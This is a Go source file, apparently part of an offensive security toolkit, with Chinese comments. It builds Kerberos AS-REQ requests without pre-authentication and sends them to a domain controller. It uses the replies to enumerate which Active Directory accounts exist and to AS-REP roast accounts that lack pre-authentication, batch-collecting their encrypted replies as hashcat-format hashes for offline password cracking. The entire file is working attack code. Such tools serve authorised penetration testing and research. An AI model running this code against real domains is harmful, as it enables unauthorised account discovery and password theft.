package kerberos

import (
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"fastsec/internal/kerberos/der"
)

// KDCRequest: KDC-REQ-BODY 参数
type KDCRequest struct {
	Realm     string
	CName     string // 用户名（AS-REQ）或空
	SName     string // 服务名（TGS-REQ）
	Etypes    []int
	Options   uint32
	Nonce     uint32
	Till      time.Time
}

// BuildASReqBody: 构造 KDC-REQ-BODY（AS-REQ 用，无预认证）
func BuildASReqBody(realm, user string, etypes []int, nonce uint32) []byte {
	// KDC-REQ-BODY ::= SEQUENCE {
	//   kdc-options[0] KDCOptions,
	//   cname[1] PrincipalName OPTIONAL,
	//   realm[2] Realm,
	//   sname[3] PrincipalName OPTIONAL,
	//   till[5] KerberosTime,
	//   nonce[7] UInt32,
	//   etype[8] SEQUENCE OF Int32 }
	principal := PrincipalName{NameType: 1, Name: []string{user}}
	// sname = krbtgt/realm（与 MIT kinit 一致）
	sname := PrincipalName{NameType: 2, Name: []string{"krbtgt", realm}}

	// etype 列表（最短 INTEGER 形式）
	var etypeList []byte
	for _, e := range etypes {
		etypeList = append(etypeList, der.Integer(e)...)
	}

	return der.Sequence(
		der.Explicit(0, der.BitString(optionsBytes(reqOptions(0x40000010)))), // forwardable+renewable-ok
		der.Explicit(1, principal.Encode()),                                  // cname
		der.Explicit(2, Realm(realm)),                                        // realm
		der.Explicit(3, sname.Encode()),                                      // sname=krbtgt
		der.Explicit(5, KerberosTime(time.Now().Add(24*time.Hour))),          // till
		der.Explicit(7, der.Int32(int(nonce))),                               // nonce
		der.Explicit(8, der.Sequence(etypeList)),                             // etype
	)
}

// optionsBytes: 把 KDCOptions 转字节（32 位大端）
func optionsBytes(opts uint32) []byte {
	return []byte{byte(opts >> 24), byte(opts >> 16), byte(opts >> 8), byte(opts)}
}

// reqOptions: 默认 options（无特殊选项）
func reqOptions(extra uint32) uint32 {
	// 0 = 无选项；加 extra（如 forwardable 0x40000000）
	return extra
}

// BuildASReq: 构造完整 AS-REQ 消息（无预认证）
func BuildASReq(realm, user string, etypes []int, nonce uint32) []byte {
	body := BuildASReqBody(realm, user, etypes, nonce)
	// AS-REQ ::= [APPLICATION 10] KDC-REQ
	// KDC-REQ ::= SEQUENCE {
	//   pvno[1] INTEGER, msg-type[2] INTEGER, req-body[4] KDC-REQ-BODY }
	kdcReq := der.Sequence(
		der.Explicit(1, der.Integer(5)),       // pvno
		der.Explicit(2, der.Integer(MsgASReq)), // msg-type
		der.Explicit(4, body),                  // req-body
	)
	return der.Application(MsgASReq, kdcReq)
}

// SendKDC: 发送数据到 KDC 并读响应（Kerberos TCP: 4字节网络序长度前缀 + 消息）
func SendKDC(kdc string, port int, data []byte, timeout time.Duration) ([]byte, error) {
	addr := fmt.Sprintf("%s:%d", kdc, port)
	if port == 0 {
		addr = fmt.Sprintf("%s:88", kdc)
	}
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	// 写 4 字节大端长度 + 消息
	var lenBuf [4]byte
	lenBuf[0] = byte(len(data) >> 24)
	lenBuf[1] = byte(len(data) >> 16)
	lenBuf[2] = byte(len(data) >> 8)
	lenBuf[3] = byte(len(data))
	if _, err := conn.Write(lenBuf[:]); err != nil {
		return nil, err
	}
	if _, err := conn.Write(data); err != nil {
		return nil, err
	}
	// 读 4 字节响应长度
	var respLen [4]byte
	if _, err := io.ReadFull(conn, respLen[:]); err != nil {
		return nil, err
	}
	msgLen := int(respLen[0])<<24 | int(respLen[1])<<16 | int(respLen[2])<<8 | int(respLen[3])
	if msgLen <= 0 || msgLen > 1<<20 {
		return nil, fmt.Errorf("invalid response length: %d", msgLen)
	}
	buf := make([]byte, msgLen)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// KRBError: 解析 KRB-ERROR 消息
type KRBError struct {
	ErrorCode int
	EText     string
	Realm     string
	EType     int
}

// ParseKRBError: 解析 KRB-ERROR (APPLICATION 30)
func ParseKRBError(data []byte) (*KRBError, error) {
	tlv, err := der.Parse(data)
	if err != nil {
		return nil, err
	}
	if tlv.Class != der.ClassApplication || tlv.Tag != MsgKRBError {
		return nil, fmt.Errorf("not a KRB-ERROR: class=%d tag=%d", tlv.Class, tlv.Tag)
	}
	items, err := der.ParseSeq(tlv.Content)
	if err != nil {
		return nil, err
	}
	e := &KRBError{}
	// KDC-REP/ERROR 内容实际是 SEQUENCE，解析其中的 context-specific 字段
	if len(items) == 1 && items[0].Tag == der.TagSequence {
		items, _ = der.ParseSeq(items[0].Content)
	}
	for _, item := range items {
		if item.Class != der.ClassContextSpecific {
			continue
		}
		switch item.Tag {
		case 6: // error-code[6]（RFC 4120 7.5.2）
			inner, err := der.Parse(item.Content)
			if err == nil {
				if n, err := inner.IntValue(); err == nil {
					e.ErrorCode = n
				}
			}
		case 11: // e-text[11]（GeneralString 显式编码）
			inner, err := der.Parse(item.Content)
			if err == nil {
				e.EText = string(inner.Content)
			} else {
				e.EText = string(item.Content)
			}
		case 12: // e-data（含 PA-ETYPE-INFO）
		}
	}
	return e, nil
}

// ASRep: 解析 AS-REP 消息
type ASRep struct {
	Crealm string
	CName  *PrincipalName
	Ticket []byte
	EncPart *EncryptedData
	Etype  int
}

// ParseASRep: 解析 AS-REP (APPLICATION 11)
func ParseASRep(data []byte) (*ASRep, error) {
	tlv, err := der.Parse(data)
	if err != nil {
		return nil, err
	}
	if tlv.Class != der.ClassApplication || tlv.Tag != MsgASRep {
		return nil, fmt.Errorf("not an AS-REP: class=%d tag=%d", tlv.Class, tlv.Tag)
	}
	items, err := der.ParseSeq(tlv.Content)
	if err != nil {
		return nil, err
	}
	rep := &ASRep{}
	if len(items) == 1 && items[0].Tag == der.TagSequence {
		items, _ = der.ParseSeq(items[0].Content)
	}
	for _, item := range items {
		if item.Class != der.ClassContextSpecific {
			continue
		}
		switch item.Tag {
		case 3: // crealm[3] 显式 GeneralString
			if inner, err := der.Parse(item.Content); err == nil {
				rep.Crealm = string(inner.Content)
			} else {
				rep.Crealm = string(item.Content)
			}
		case 4: // cname
			if p, err := DecodePrincipalName(item.Content); err == nil {
				rep.CName = p
			}
		case 5: // ticket[5] 显式：Content 是 Ticket TLV（含 APPLICATION 1 标签）
			rep.Ticket = item.Content
		case 6: // enc-part
			if e, err := DecodeEncryptedData(item.Content); err == nil {
				rep.EncPart = e
				rep.Etype = e.Etype
			}
		}
	}
	return rep, nil
}

// EnumerateUser: 检测单用户是否存在（AS-REQ 响应差异）
//  返回: true=用户存在, false=不存在, err=网络/其他错误
//  原理: 无预认证 AS-REQ →
//    - 用户存在+要求预认证: KRB-ERROR PREAUTH_REQUIRED(25)
//    - 用户存在+无预认证: AS-REP(11)（可 AS-REP Roast）
//    - 用户不存在: KRB-ERROR C_PRINCIPAL_UNKNOWN(6)
func EnumerateUser(kdc string, port int, realm, user string, timeout time.Duration) (bool, bool, error) {
	nonce := uint32(time.Now().UnixNano() & 0xffffffff)
	req := BuildASReq(realm, user, []int{EncTypeRC4Hmac, EncTypeAES256, EncTypeAES128}, nonce)
	resp, err := SendKDC(kdc, port, req, timeout)
	if err != nil {
		return false, false, err
	}
	tlv, err := der.Parse(resp)
	if err != nil {
		return false, false, err
	}
	if tlv.Class == der.ClassApplication && tlv.Tag == MsgASRep {
		// 无预认证账户 → 存在且可 AS-REP Roast
		return true, true, nil
	}
	if tlv.Class == der.ClassApplication && tlv.Tag == MsgKRBError {
		e, err := ParseKRBError(resp)
		if err != nil {
			return false, false, err
		}
		switch e.ErrorCode {
		case KDCErrPreauthRequired:
			return true, false, nil // 存在，需预认证
		case KDCErrCPrincipalUnknown:
			return false, false, nil // 不存在
		default:
			return false, false, fmt.Errorf("KRB-ERROR code=%d text=%s", e.ErrorCode, e.EText)
		}
	}
	return false, false, fmt.Errorf("unexpected response class=%d tag=%d", tlv.Class, tlv.Tag)
}

// ASRepRoastUser: 对单用户做 AS-REP Roast（获取 hashcat 格式哈希）
func ASRepRoastUser(kdc string, port int, realm, user string, timeout time.Duration) (string, error) {
	nonce := uint32(time.Now().UnixNano() & 0xffffffff)
	req := BuildASReq(realm, user, []int{EncTypeRC4Hmac, EncTypeAES256, EncTypeAES128}, nonce)
	resp, err := SendKDC(kdc, port, req, timeout)
	if err != nil {
		return "", err
	}
	tlv, err := der.Parse(resp)
	if err != nil {
		return "", err
	}
	if tlv.Class != der.ClassApplication || tlv.Tag != MsgASRep {
		if tlv.Class == der.ClassApplication && tlv.Tag == MsgKRBError {
			e, _ := ParseKRBError(resp)
			return "", fmt.Errorf("AS-REP failed: code=%d (user exists but requires preauth, or doesn't exist)", e.ErrorCode)
		}
		return "", fmt.Errorf("unexpected response")
	}
	rep, err := ParseASRep(resp)
	if err != nil {
		return "", err
	}
	if rep.EncPart == nil {
		return "", fmt.Errorf("no enc-part in AS-REP")
	}
	// 生成 hashcat 格式 $krb5asrep$<etype>$user@realm:<hex enc-part>
	cipherHex := hex.EncodeToString(rep.EncPart.Cipher)
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s", rep.EncPart.Etype, user, realm, cipherHex), nil
}

// ASRepRoast: 对用户列表批量 AS-REP Roast
func ASRepRoast(kdc string, port int, realm string, users []string, timeout time.Duration) []string {
	var hashes []string
	for _, u := range users {
		h, err := ASRepRoastUser(kdc, port, realm, u, timeout)
		if err == nil && h != "" {
			hashes = append(hashes, h)
		}
	}
	return hashes
}

// EnumerateUsers: 批量用户枚举（返回存在的用户）
func EnumerateUsers(kdc string, port int, realm string, users []string, timeout time.Duration) []string {
	var valid []string
	for _, u := range users {
		exists, roastable, err := EnumerateUser(kdc, port, realm, u, timeout)
		if err == nil && exists {
			valid = append(valid, u)
			if roastable {
				valid = append(valid, u+" (AS-REP ROASTABLE)")
			}
		}
	}
	// 去重（去掉 roastable 标记后缀）
	seen := map[string]bool{}
	var out []string
	for _, v := range valid {
		base := strings.TrimSuffix(v, " (AS-REP ROASTABLE)")
		if !seen[base] {
			seen[base] = true
			out = append(out, v)
		}
	}
	return out
}
